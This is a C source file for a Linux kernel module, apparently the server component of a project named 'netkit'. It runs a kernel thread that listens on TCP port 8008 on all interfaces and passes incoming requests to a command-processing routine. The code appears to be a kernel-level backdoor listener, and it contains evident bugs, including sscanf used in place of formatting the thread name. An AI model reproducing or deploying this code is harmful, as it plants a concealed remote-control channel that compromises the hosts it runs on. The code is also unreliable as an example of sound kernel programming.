#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>

#include "server.h"

#include "../../core/cmd/cmd.h"
#include "../../core/packet/packet.h"
#include "../../mem/mngt.h"
#include "../../sys/socket.h"

#define SERVER_IP "0.0.0.0"
#define SERVER_PORT 8008

#define KTHREAD_LOOP_NAME "netkit-loop"

static struct task_struct *task_loop = NULL;

static struct socket *server_listen(const char* server_ip, unsigned short server_port)
{
    static struct socket *sock;
    struct sockaddr_in *addr;
    int err;

    // allocate IPv4/TCP socket
    err = socket_create(in_aton(server_ip), htons(server_port), &sock, &addr);
    if (err < 0)
    {
        pr_err("[!] failed to create socket: %d\n", err);
        goto LAB_ERR_NO_SOCK;
    }

    err = kernel_bind(sock, (struct sockaddr *)addr, sizeof(*addr));
    if (err < 0) 
    {
        pr_err("[!] failed to bind socket: %d\n", err);
        goto LAB_ERR;
    }

    err = sock->ops->listen(sock, 10);
    if (err < 0)
    {
        pr_err("[!] failed to listen on socket (err: %d)\n", err);
        goto LAB_ERR;
    }

    return sock;

LAB_ERR:
    sock_release(sock);
    kzfree(addr, sizeof(*addr));
LAB_ERR_NO_SOCK:
    return ERR_PTR(err);

}

static int server_conn_handler(void *args)
{
    server_packet_t *packet = (server_packet_t*)args;
    u8* res_buf = NULL;
    size_t res_buflen = 0;
    int retv;

    pr_err("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
    retv = io_process(packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
    pr_err("[*] sending response to client (res_buflen: %lu)...\n", res_buflen);
    retv = socket_write(packet->client_sk, res_buf, res_buflen);
    
    sock_release(packet->client_sk);
    kzfree(packet->req_buf, packet->req_buflen);
    kzfree(packet, sizeof(*packet));
    kzfree(res_buf, res_buflen);
    
    return retv;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *server_sk;
    struct socket *client_sk;
    server_packet_t *packet;
    int conn_retv;
    int retv = 0;

    server_sk = server_listen(SERVER_IP, SERVER_PORT);
    if (IS_ERR(server_sk))
    {
        pr_err("[!] failed to get socket (err: %ld)\n", PTR_ERR(server_sk));
        retv = PTR_ERR(server_sk);
        goto LAB_OUT_NO_SOCK;
    }

    pr_err("[+] started listening for connections\n");
    
    while (likely(!kthread_should_stop()))
    {
        // conn polling needs to be optimized for speed, to make overhead minimal
        pr_err("[*] checking for connection...\n");
		if (unlikely(try_to_freeze()))
			continue;

        conn_retv = kernel_accept(server_sk, &client_sk, SOCK_NONBLOCK);
        if (likely(conn_retv == -EAGAIN))
        {
            schedule_timeout_interruptible(HZ / 10);  // 100ms check rate
            continue;
        }
        
        if (conn_retv < 0) {
            continue;
        }

        pr_err("[+] received connection\n");

        packet = kzmalloc(sizeof(*packet), GFP_KERNEL);
        if (IS_ERR(packet))
            goto LAB_CONN_OUT_NO_PACKET;

        packet->client_sk = client_sk;
        retv = socket_read(packet->client_sk, &packet->req_buf, &packet->req_buflen);
        if (retv < 0)
        {
            pr_err("[!] failed to read bytes from connection\n");
            goto LAB_CONN_OUT;
        }

        kthread_name_id = (int)get_random_long();
        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);

        pr_err("[+] starting server conn handler\n");

        // child should free packet
        conn_task = kthread_run(server_conn_handler, packet, kthread_name);
        if (IS_ERR(conn_task))
        {
            pr_err("[!] failed to start handler\n");
            goto LAB_CONN_OUT;
        }

        continue;

LAB_CONN_OUT:
        if (packet->req_buf)
            kzfree(packet->req_buf, packet->req_buflen);

        kzfree(packet, sizeof(*packet));
        packet = NULL;
LAB_CONN_OUT_NO_PACKET:
        sock_release(client_sk);
        client_sk = NULL;
    }

    pr_err("[*] received kthread_stop. quitting...\n");
    sock_release(server_sk);
LAB_OUT_NO_SOCK:
    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
static int server_init(void)
{
    int retv = 0;

    pr_err("[*] starting server_conn_loop...\n");

    task_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
    if (IS_ERR(task_loop))
        return PTR_ERR(task_loop);
    
    return retv;
}

static int server_exit(void)
{
    int retv;

    if (!task_loop)
    {
        pr_err("[!] task loop does not exist when exiting\n");
        return -ECHILD;
    }

    retv = kthread_stop(task_loop);
    if (retv < 0)
        pr_err("[!] kthread returned error\n");

    return retv;
}

const struct io_ops IO_SERVER_OPS = {
    .init = server_init,
    .exit = server_exit
};